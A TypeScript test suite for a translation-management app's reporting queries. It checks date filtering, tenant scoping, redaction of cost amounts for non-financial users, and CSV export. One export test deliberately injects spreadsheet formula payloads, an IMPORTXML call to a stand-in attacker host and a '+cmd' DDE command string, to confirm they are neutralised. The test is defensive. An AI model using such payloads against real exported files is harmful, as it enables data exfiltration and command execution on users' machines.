/*
 * Copyright (c) 2026 Hyperlocalise Pty Ltd
 *
 * Use of this software is governed by the Business Source License 1.1
 * included in this application's LICENSE file.
 *
 * Change Date: Four years after publication of the applicable version.
 *
 * On the Change Date, in accordance with the Business Source License, use
 * of this software will be governed by the GNU General Public License
 * Version 2.0 or later.
 */
import "dotenv/config";

import { randomUUID } from "node:crypto";

import { afterEach, beforeAll, describe, expect, it } from "vite-plus/test";

import { createProjectTestFixture } from "@/api/routes/project/project.fixture";
import { db, schema } from "@/lib/database/client";

import { queryReport, reportCsv, type ReportRow } from "./query";

const projectFixture = createProjectTestFixture();

const FROM = "2026-08-01";
const TO = "2026-08-31";
const IN_RANGE = new Date("2026-08-15T12:00:00.000Z");
const OUT_OF_RANGE = new Date("2026-07-01T12:00:00.000Z");

beforeAll(async () => {
  await db.$client.query("select 1");
});

afterEach(async () => {
  await projectFixture.cleanup();
});

async function seedReportFacts() {
  const { organization, project, user } = await projectFixture.createStoredProjectFixture();
  const other = await projectFixture.createStoredProjectFixture();

  await db.insert(schema.reportingCosts).values([
    {
      organizationId: organization.id,
      projectId: project.id,
      operationKey: `human:${randomUUID()}`,
      kind: "human",
      step: "translation",
      targetLocale: "fr-FR",
      amountUsd: "12.50000000",
      basis: "rate",
      createdAt: IN_RANGE,
    },
    {
      organizationId: organization.id,
      projectId: project.id,
      operationKey: `ai:${randomUUID()}`,
      kind: "ai",
      step: "translation",
      targetLocale: "fr-FR",
      amountUsd: "1.25000000",
      basis: "reported",
      inputTokens: 100,
      outputTokens: 40,
      createdAt: IN_RANGE,
    },
    {
      organizationId: organization.id,
      projectId: null,
      operationKey: `org-expense:${randomUUID()}`,
      kind: "expense",
      step: "translation",
      amountUsd: "50.00000000",
      basis: "manual",
      note: "Shared tooling",
      createdAt: IN_RANGE,
    },
    {
      organizationId: organization.id,
      projectId: project.id,
      operationKey: `out-of-range:${randomUUID()}`,
      kind: "human",
      step: "translation",
      amountUsd: "99.00000000",
      basis: "rate",
      createdAt: OUT_OF_RANGE,
    },
    {
      organizationId: other.organization.id,
      projectId: other.project.id,
      operationKey: `other-org:${randomUUID()}`,
      kind: "human",
      step: "translation",
      amountUsd: "7.00000000",
      basis: "rate",
      createdAt: IN_RANGE,
    },
  ]);

  const [analysis] = await db
    .insert(schema.reportingAnalyses)
    .values({
      organizationId: organization.id,
      projectId: project.id,
      step: "translation",
      segmentId: `seg_${randomUUID()}`,
      sourceRevision: `rev_${randomUUID()}`,
      sourceLocale: "en-US",
      targetLocale: "fr-FR",
      words: 25,
      billable: true,
      bucket: "new",
      createdAt: IN_RANGE,
    })
    .returning();

  await db.insert(schema.reportingActivity).values({
    organizationId: organization.id,
    projectId: project.id,
    operationKey: `completion:${randomUUID()}`,
    kind: "completion",
    step: "translation",
    targetLocale: "fr-FR",
    analysisId: analysis.id,
    durationMs: 1500,
    createdAt: IN_RANGE,
  });

  await db.insert(schema.reportingTimeEntries).values({
    organizationId: organization.id,
    projectId: project.id,
    contributorId: user.id,
    step: "translation",
    targetLocale: "fr-FR",
    workDate: IN_RANGE,
    minutes: 45,
    createdAt: IN_RANGE,
  });

  return { organization, project, other };
}

function baseQuery(
  overrides: Partial<{
    from: string;
    to: string;
    projectId: string;
    jobId: string;
    targetLocale: string;
    step: "translation" | "review";
    interval: "day" | "week";
    view: "overview" | "words" | "time" | "costs";
    format: "json" | "csv";
  }> = {},
) {
  return {
    from: FROM,
    to: TO,
    interval: "day" as const,
    view: "overview" as const,
    format: "json" as const,
    ...overrides,
  };
}

describe("queryReport", () => {
  it("redacts financial amounts for members while still returning AI token usage", async () => {
    const { organization, project } = await seedReportFacts();

    const report = await queryReport({
      organizationId: organization.id,
      projectIds: [project.id],
      financial: false,
      query: baseQuery({ view: "costs" }),
    });

    expect(report.financial).toBe(false);
    expect(report.from).toBe(FROM);
    expect(report.to).toBe(TO);

    const kinds = report.rows.map((row) => row.kind).sort();
    expect(kinds).toEqual(["ai"]);
    expect(report.rows.every((row) => row.amountUsd === null)).toBe(true);
    expect(report.rows[0]).toMatchObject({
      kind: "ai",
      inputTokens: 100,
      outputTokens: 40,
      amountUsd: null,
    });
  });

  it("includes human, AI, and org-level expense amounts when financial access is allowed", async () => {
    const { organization, project } = await seedReportFacts();

    const report = await queryReport({
      organizationId: organization.id,
      projectIds: [project.id],
      financial: true,
      query: baseQuery({ view: "costs" }),
    });

    const byKind = Object.fromEntries(report.rows.map((row) => [row.kind, row]));
    expect(byKind.human).toMatchObject({
      projectId: project.id,
      amountUsd: "12.50000000",
    });
    expect(byKind.ai).toMatchObject({
      amountUsd: "1.25000000",
      inputTokens: 100,
      outputTokens: 40,
    });
    expect(byKind.expense).toMatchObject({
      projectId: null,
      amountUsd: "50.00000000",
    });
    expect(report.rows.some((row) => row.amountUsd === "99.00000000")).toBe(false);
    expect(report.rows.some((row) => row.amountUsd === "7.00000000")).toBe(false);
  });

  it("uses an impossible project scope when projectIds is empty", async () => {
    const { organization, project } = await seedReportFacts();

    const withoutFinancial = await queryReport({
      organizationId: organization.id,
      projectIds: [],
      financial: false,
      query: baseQuery({ view: "costs" }),
    });
    expect(withoutFinancial.rows).toEqual([]);

    const withFinancial = await queryReport({
      organizationId: organization.id,
      projectIds: [],
      financial: true,
      query: baseQuery({ view: "costs" }),
    });
    expect(withFinancial.rows).toHaveLength(1);
    expect(withFinancial.rows[0]).toMatchObject({
      kind: "expense",
      projectId: null,
      amountUsd: "50.00000000",
    });
    expect(withFinancial.rows.some((row) => row.projectId === project.id)).toBe(false);
  });

  it("filters fact kinds by report view", async () => {
    const { organization, project } = await seedReportFacts();

    const words = await queryReport({
      organizationId: organization.id,
      projectIds: [project.id],
      financial: false,
      query: baseQuery({ view: "words" }),
    });
    expect(words.rows.map((row) => row.kind)).toEqual(["completion"]);
    expect(words.rows[0]).toMatchObject({ words: 25, durationMs: 1500 });
    expect(words.analysis).toMatchObject({ sourceWords: 25, workloadWords: 25 });

    const time = await queryReport({
      organizationId: organization.id,
      projectIds: [project.id],
      financial: false,
      query: baseQuery({ view: "time" }),
    });
    expect(time.rows.map((row) => row.kind).sort()).toEqual(["time"]);
    expect(time.rows[0]).toMatchObject({ minutes: 45 });

    const costs = await queryReport({
      organizationId: organization.id,
      projectIds: [project.id],
      financial: true,
      query: baseQuery({ view: "costs" }),
    });
    expect(costs.rows.map((row) => row.kind).sort()).toEqual(["ai", "expense", "human"]);
  });
});

describe("reportCsv", () => {
  const sampleRows: ReportRow[] = [
    {
      period: "2026-08-15",
      projectId: "project_1",
      jobId: null,
      targetLocale: "fr-FR",
      step: "translation",
      bucket: null,
      kind: "human",
      words: 0,
      minutes: 0,
      durationMs: 0,
      amountUsd: "12.50000000",
      inputTokens: 0,
      outputTokens: 0,
      unavailable: 0,
      count: 1,
    },
    {
      period: "2026-08-15",
      projectId: "project_1",
      jobId: null,
      targetLocale: "fr-FR",
      step: "translation",
      bucket: null,
      kind: "ai",
      words: 0,
      minutes: 0,
      durationMs: 0,
      amountUsd: null,
      inputTokens: 100,
      outputTokens: 40,
      unavailable: 0,
      count: 1,
    },
  ];

  it("omits amountUsd unless financial access is enabled", () => {
    const memberCsv = reportCsv(sampleRows, false);
    const adminCsv = reportCsv(sampleRows, true);

    expect(memberCsv.split("\r\n")[0]).not.toContain("amountUsd");
    expect(memberCsv).not.toContain("12.50000000");
    expect(adminCsv.split("\r\n")[0]).toContain("amountUsd");
    expect(adminCsv).toContain("12.50000000");
  });

  it("neutralizes spreadsheet formulas in exported cells", () => {
    const csv = reportCsv(
      [
        {
          ...sampleRows[0],
          step: '=IMPORTXML("https://evil.example")',
          kind: "+cmd|'/C calc'!A0",
        },
      ],
      false,
    );

    expect(csv).toContain('"\'=IMPORTXML(""https://evil.example"")"');
    expect(csv).toContain("\"'+cmd|'/C calc'!A0\"");
  });
});
